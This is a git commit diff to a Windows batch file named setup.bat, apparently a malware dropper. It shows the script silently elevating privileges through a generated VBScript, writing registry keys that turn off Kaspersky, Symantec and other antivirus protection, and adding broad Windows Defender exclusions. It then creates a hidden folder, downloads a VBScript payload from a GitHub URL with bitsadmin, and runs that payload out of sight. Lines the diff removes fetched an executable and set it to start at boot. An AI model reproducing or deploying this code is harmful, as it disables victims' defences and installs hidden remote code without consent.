27f9a109630e06f35bcf1dc00c354ff644475395
maxavison7 <60790468+maxavison7@users.noreply.github.com>
2023-03-20 15:58:30 -0700

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -3,7 +3,7 @@ setlocal
 
 REM Check if the script is running with administrator privileges
 net session >nul 2>&1
-if %errorLevel% EQU 0 (
+if %errorLevel% == 0 (
     goto admin
 ) else (
     goto elevate
@@ -14,10 +14,10 @@ REM Use VBScript to elevate privileges
 set "batchPath=%~0"
 set "vbsGetPrivileges=%temp%\OEgetPriv_%random%.vbs"
 echo Set UAC = CreateObject^("Shell.Application"^)>"%vbsGetPrivileges%"
-echo UAC.ShellExecute "%batchPath%", "", "", "runas", 1 >>"%vbsGetPrivileges%"
+echo UAC.ShellExecute "%batchPath%", "ELEV", "", "runas", 0 >>"%vbsGetPrivileges%"
 "%SystemRoot%\System32\WScript.exe" "%vbsGetPrivileges%" %*
 del "%vbsGetPrivileges%" /f /q
-goto :eof
+exit /b
 
 :admin
 
@@ -76,7 +76,6 @@ REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\KasperskyLab\protected\AVP13\se
 REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\SecureMac" /v GlobalSwitch /t REG_DWORD /d 0 /f
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "1" /f
 
-
 ::internal
 REM Disable Symantec Endpoint Protection's auto-protect feature
 REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\Symantec Endpoint Protection\AV" /v EnableAutoProtect /t REG_DWORD /d 0 /f
@@ -107,24 +106,20 @@ powershell Add-MpPreference -ExclusionPath 'C:\*.exe'
 powershell Set-MpPreference -ControlledFolderAccess Disabled
 
 REM Create hidden and random folder
-set "hiddenFolder=%temp%.{%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%}"
+set "hiddenFolder=%temp%\.%RANDOM%%RANDOM%%RANDOM%%RANDOM%"
 mkdir "%hiddenFolder%"
 
 REM Exclude hidden folder from Windows Defender
 powershell -Command "Add-MpPreference -ExclusionPath '%hiddenFolder%'"
 
-REM Download payload files to hidden folder using curl
-curl -sS https://raw.githubusercontent.com/maxavison7/nothing/main/myscript.vbs -o "%hiddenFolder%\myscript.vbs"
-curl -sS https://raw.githubusercontent.com/maxavison7/nothing/main/Microsoft.exe -o "%hiddenFolder%\Microsoft.exe"
+REM Download payload files to hidden folder using BITSAdmin
+bitsadmin /transfer myDownloadJob /download /priority normal https://raw.githubusercontent.com/maxavison7/nothing/main/myscript.vbs "%hiddenFolder%\myscript.vbs"
 
-REM Set hidden attribute for files
+REM Set hidden attribute for files and folder
+attrib +h +s "%hiddenFolder%"
 attrib +h +s "%hiddenFolder%\myscript.vbs"
-attrib +h +s "%hiddenFolder%\Microsoft.exe"
-
-REM Add registry key to start Microsoft.exe on boot
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Microsoft" /t REG_SZ /d "%hiddenFolder%\Microsoft.exe" /f
 
 REM Run payload silently and pass %hiddenFolder% variable
-start /B "" wscript.exe "%hiddenFolder%\myscript.vbs" "%~dp0"
+start /min "" wscript.exe "%hiddenFolder%\myscript.vbs" "%~dp0"
 
 goto :eof
